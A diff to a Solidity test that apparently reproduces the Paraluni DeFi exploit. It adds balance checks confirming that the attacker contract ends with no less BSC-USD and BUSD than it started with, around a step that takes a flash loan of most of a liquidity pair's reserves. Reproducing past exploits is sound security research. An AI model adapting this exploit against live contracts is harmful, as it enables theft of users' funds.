@@ -62,6 +62,9 @@ contract Exploit_Paraluni is TestHarness, TokenBalanceTracker {
     }
 
     function test_attack() external {
+        uint256 balanceBeforeBSCUSD = bscusd.balanceOf(address(this));
+        uint256 balanceBeforeBUSD = busd.balanceOf(address(this));
+
         console.log('===== STEP 1: Request Loan =====');
 
         uint256 bscToRequest = bscusd.balanceOf(address(paraluniBSCBUSDPair)) * 776 / 1000;
@@ -73,6 +76,11 @@ contract Exploit_Paraluni is TestHarness, TokenBalanceTracker {
             address(this), 
             hex'deadbeef'
         );
+
+        uint256 balanceAfterBSCUSD = bscusd.balanceOf(address(this));
+        uint256 balanceAfterBUSD = busd.balanceOf(address(this));
+        assertGe(balanceAfterBSCUSD, balanceBeforeBSCUSD);
+        assertGe(balanceAfterBUSD, balanceBeforeBUSD);
 
     }
 
